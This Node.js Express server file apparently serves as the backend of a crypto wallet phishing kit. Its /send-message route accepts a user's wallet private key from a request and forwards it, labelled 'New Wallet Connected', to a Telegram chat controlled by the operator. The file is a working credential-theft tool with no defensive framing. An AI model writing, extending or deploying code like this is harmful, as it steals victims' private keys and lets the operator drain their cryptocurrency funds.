
require("dotenv").config();
const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(cors());


// ✅ Add a root route to confirm the server is running
app.get("/", (req, res) => {
    res.send("Backend is live! 🚀");
});


// Route to send message to Telegram
app.post("/send-message", async (req, res) => {
    const { privateKey } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        return res.status(500).json({ error: "Missing API credentials" });
    }

    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await axios.post(url, {
            chat_id: chatId,
            text: `New Wallet Connected:\n\n🔑 ${privateKey}`
        });

        res.json({ success: true, message: "Message sent!" });
    } catch (error) {
        console.error("Error sending message:", error.response?.data || error.message);
        res.status(500).json({ error: "Failed to send message" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
